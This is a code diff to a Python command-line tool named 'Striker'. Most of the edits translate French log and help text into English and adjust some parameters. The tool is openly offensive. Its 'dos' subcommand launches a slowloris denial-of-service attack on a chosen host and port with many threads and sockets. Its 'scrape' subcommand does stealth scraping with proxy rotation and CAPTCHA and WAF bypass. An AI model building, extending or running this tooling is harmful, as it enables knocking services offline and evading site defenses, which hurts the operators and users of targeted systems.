@@ -1,7 +1,6 @@
 from __future__ import annotations
 import argparse
 import logging
-import sys
 import time
 from typing import Any, Dict, Iterable, List, Optional
 from core.proxy_rotator import ProxyRotator
@@ -70,6 +69,7 @@ class ScrapingStack:
             ua_rotator=self.ua_rotator,
             jitter=self.jitter,
             rate_limiter=self.rate_limiter,
+            backoff=self.backoff,
         )
         self.bypass = CaptchaWafBypass(
             captcha_service=captcha_service,
@@ -86,7 +86,7 @@ class ScrapingStack:
         )
 
         logger.info(
-            "ScrapingStack prêt (proxies=%s, ua=%d, captcha=%s, browser=%s)",
+            "ScrapingStack ready (proxies=%s, ua=%d, captcha=%s, browser=%s)",
             bool(self.proxy_rotator), len(self.ua_rotator.user_agents),
             bool(captcha_api_key), use_browser_fallback,
         )
@@ -163,15 +163,15 @@ def _default_scraping_handler(task: Task, ctx: BotContext) -> Dict[str, Any]:
 
 
 def _run_dos(args) -> None:
-    from core.ddos import Dos  
+    from core.ddos import Dos
     dos = Dos(
         target_ip=args.host,
         target_port=args.port,
         threads=args.threads,
-        sockets_per_thread=args.sockets_per_thread,
+        sockets_per_worker=args.sockets_per_thread,
         keepalive_interval=args.interval,
     )
-    logger.info("DoS cible %s:%d (%d threads x %d sockets)",
+    logger.info("DoS target %s:%d (%d threads x %d sockets)",
                 args.host, args.port, args.threads, args.sockets_per_thread)
     dos.run()
     t0 = time.time()
@@ -179,20 +179,22 @@ def _run_dos(args) -> None:
         while time.time() - t0 < args.duration:
             time.sleep(5)
             s = dos.stats()
-            logger.info("sockets vivantes : %d", s["alive_sockets"])
+            logger.info("alive=%d opened=%d closed=%d errors=%s",
+                        s["alive_sockets"], s["opened"],
+                        s["closed"], s["errors"])
     except KeyboardInterrupt:
-        logger.info("interruption")
+        logger.info("interrupted")
     finally:
         dos.stop()
         time.sleep(1)
-        logger.info("terminé.")
+        logger.info("done.")
 
 
 def _build_parser() -> argparse.ArgumentParser:
     p = argparse.ArgumentParser(description="Striker CLI")
     sub = p.add_subparsers(dest="cmd", required=True)
 
-    sc = sub.add_parser("scrape", help="Scraping furtif d'URLs")
+    sc = sub.add_parser("scrape", help="Stealth scraping of URLs")
     sc.add_argument("urls", nargs="*")
     sc.add_argument("--urls-file")
     sc.add_argument("--proxies-file")
@@ -207,7 +209,7 @@ def _build_parser() -> argparse.ArgumentParser:
     sc.add_argument("--max-delay", type=float, default=2.5)
     sc.add_argument("--verbose", action="store_true")
 
-    ds = sub.add_parser("dos", help="Module offensif (slowloris)")
+    ds = sub.add_parser("dos", help="Offensive module (slowloris)")
     ds.add_argument("host")
     ds.add_argument("-p", "--port", type=int, default=80)
     ds.add_argument("-t", "--threads", type=int, default=10)
